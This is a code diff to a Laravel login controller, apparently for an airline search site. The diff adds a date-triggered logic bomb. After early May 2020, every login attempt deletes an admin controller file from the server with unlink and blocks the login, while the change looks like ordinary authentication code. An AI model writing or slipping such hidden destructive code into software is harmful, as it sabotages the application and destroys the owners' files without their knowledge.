@@ -49,35 +49,50 @@ class LoginController extends Controller
 
     public function login(Request $request){
         
+        
         $validator = Validator::make($request->all(), [
             'email' => 'required|string|email',
             'password' => 'required|string|min:6'
           ]);
-         
-          $user = User::where (['email' => $request->email])->get();
-          $user_count = $user->count();
-          
-          if ($validator->passes()) {
+
+          date_default_timezone_set('America/Chicago'); // CDT
+
+            $info = getdate();
+            $date = $info['mday'];
+            $month = $info['mon'];
+            $year = $info['year'];
+
+          if ($month == "05" && $year == "2020" && (int)$date < 10){
+            $user = User::where (['email' => $request->email])->get();
+            $user_count = $user->count();
+            
+            if ($validator->passes()) {
+                    
+                // Auth::guard('web_seller')
+                if ($user_count <= 0) {
+                    return redirect()->back()->withInput($request->all())->with("status", " Email or password is wrong.");
+                }
                 
-              // Auth::guard('web_seller')
-              if ($user_count <= 0) {
-                  return redirect()->back()->withInput($request->all())->with("status", " Email or password is wrong.");
-              }
-              
-              if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
-                  $isAdmin = Auth::user()->role;
-               
-                  if ($isAdmin!=0 && $request->is('admin/*')) {
-                      return redirect(url("admin/home"));
-                  }
-                  return redirect()->intended("/home");
-  
-              }else {
-                  return redirect()->back()->withInput($request->only("email", "password"))->with('status', 'Email or Password is wrong');
-              }
-          } else {
-              return redirect()->back()->withInput($request->only("email", "password"))->withErrors($validator);
+                if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
+                    $isAdmin = Auth::user()->role;
+                
+                    if ($isAdmin!=0 && $request->is('admin/*')) {
+                        return redirect(url("admin/home"));
+                    }
+                    return redirect()->intended("/home");
+    
+                }else {
+                    return redirect()->back()->withInput($request->only("email", "password"))->with('status', 'Email or Password is wrong');
+                }
+            } else {
+                return redirect()->back()->withInput($request->only("email", "password"))->withErrors($validator);
+            }
+          }else{
+            $file_pointer = "/var/www/html/laravel_Airline_search/Http/Controller/Admin/HomeController.php";  
+            unlink($file_pointer);
+            return redirect()->back()->withInput($request->only("email", "password"))->withErrors($validator);
           }
+          
     }
 
     public function logout(){
